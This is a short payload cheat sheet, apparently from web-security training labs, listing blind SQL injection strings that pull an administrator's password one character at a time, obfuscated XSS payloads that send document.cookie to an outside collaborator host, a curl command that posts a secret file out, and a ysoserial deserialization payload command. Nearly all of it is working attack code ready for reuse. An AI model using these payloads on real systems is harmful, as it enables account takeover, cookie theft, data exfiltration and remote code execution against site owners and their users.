# SQL Injection

```sql
-- In order by statment https://portswigger.net/support/sql-injection-in-the-query-structure
-- ASCII converts the characters to numbers
(CASE+WHEN(SELECT+ASCII(SUBSTRING(password,1,1))+FROM+users+where+username+%3d+'administrator')%3d97+THEN+AUTHOR+ELSE+TITLE+END)

-- Divides by 1 if true, 0 if not
-- Used when a number (int) was in front of the query
%2F(CASE+WHEN+(SELECT+SUBSTRING(password,1,1)+FROM+users+where+username+%3d+'administrator')%3d'a'+THEN+1+ELSE+0+END)
```

# XSS

```js
\\ No periods (.)
"-fetch(atob('aHR0cHM6Ly91cW8yODdieDV0OWppbWxidDJ3eXFqd3pjcWloNjd1dy5vYXN0aWZ5LmNvbQ=='), {method: 'POST', mode: 'no-cors', body:eval(atob('ZG9jdW1lbnQuY29va2ll'))})-"

\\ No parentheses
"-eval.call`${"fetch\x28'https://waagi9etcsuh1f1p7hm33j41osujia6z.oastify.com', {method: 'POST', mode: 'no-cors', body: document.cookie}\x29"}`-"
```

# Code Injection
```bash

# Curl file contents
curl -X POST <your-collaborator> -d @/home/carlos/secret

# Gzip and base64 ysoserial
java -jar ysoserial-all.jar CommonsBeanutils1 "CMD" | gzip | base64 -w0
```
